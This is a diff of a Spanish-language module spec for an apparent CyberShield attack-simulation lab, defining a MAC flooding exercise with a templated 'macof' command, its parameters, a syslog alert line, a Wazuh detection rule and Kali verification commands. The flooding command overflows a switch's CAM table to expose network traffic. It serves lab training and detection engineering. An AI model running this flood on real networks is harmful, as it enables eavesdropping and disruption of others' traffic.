@@ -1,53 +1,33 @@
-# MOD01: MAC Flooding
+# MOD01 — MAC Flooding
+ID: LAN-001 | MITRE: T1557 | Wazuh Rule: 100500 | Risk: HIGH
 
-## Teoría
-La tabla CAM del switch asocia MACs con puertos. Si se satura con MACs falsas, el switch retransmite por todas las interfaces (modo hub), exponiendo el tráfico de red.
+## Comando (INMUTABLE)
+sudo macof -i {{interface}} -n {{count}}
+Alternativa con destino: sudo macof -i {{interface}} -d {{target_ip}}
 
-> **Problema crítico:** tun0 filtra tramas Capa 2. Usar siempre eth0.
+## Parámetros
+| name       | type   | default | required |
+|------------|--------|---------|----------|
+| interface  | text   | eth0    | true     |
+| count      | number | 5000    | true     |
+| target_ip  | text   | ""      | false    |
 
-## Plantilla JSON (MongoDB)
+## Logger (INMUTABLE)
+logger -t CyberShield -p local0.alert "SEC_VIOLATION: MAC Flooding detected on Port 1 - Interface {{interface}} - {{count}} packets sent - CAM Table Overflow confirmed - MITRE:T1557"
 
-```json
-[
-  {
-    "id": "LAN-001",
-    "name": "MAC Flooding",
-    "module": "LAN",
-    "mitre_id": "T1557",
-    "risk_level": "HIGH",
-    "wazuh_rule_id": 100500,
-    "description": "Satura la tabla CAM del switch enviando MACs falsas para forzar modo hub y exponer el tráfico de red completo del segmento.",
-    "command": "sudo macof -i {{interface}} -n {{count}}",
-    "command_alt": "sudo macof -i {{interface}} -d {{target_ip}}",
-    "parameters": [
-      {
-        "name": "interface",
-        "label": "Interfaz de red",
-        "type": "text",
-        "default": "eth0",
-        "required": true,
-        "placeholder": "eth0",
-        "hint": "Usar eth0 (bridge Proxmox Capa 2). No usar tun0."
-      },
-      {
-        "name": "count",
-        "label": "Número de tramas",
-        "type": "number",
-        "default": 5000,
-        "required": true,
-        "placeholder": "5000"
-      },
-      {
-        "name": "target_ip",
-        "label": "IP destino (opcional)",
-        "type": "text",
-        "default": "",
-        "required": false,
-        "placeholder": "192.168.1.1",
-        "hint": "Dejar vacío para inundación genérica"
-      }
-    ],
-    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: MAC Flooding detected on Port 1 - Interface {{interface}} - {{count}} packets sent - CAM Table Overflow confirmed - MITRE:T1557\""
-  }
-]
+## Regla Wazuh (INMUTABLE)
+<rule id="100500" level="12">
+  <if_sid>1002</if_sid>
+  <match>SEC_VIOLATION: MAC Flooding</match>
+  <description>ALERTA CYBERSHIELD: Ataque MAC Flooding detectado</description>
+  <mitre><id>T1557</id></mitre>
+</rule>
+
+## Nota crítica
+tun0 filtra Capa 2. Usar siempre eth0 (bridge Proxmox).
+
+## Verificación en Kali (ejecutar en paralelo al ataque)
+```bash
+watch -n1 "sudo arp -n | wc -l"
+tcpdump -i eth0 -nn 'ether[0] & 1 = 0' 2>/dev/null | head -20
 ```
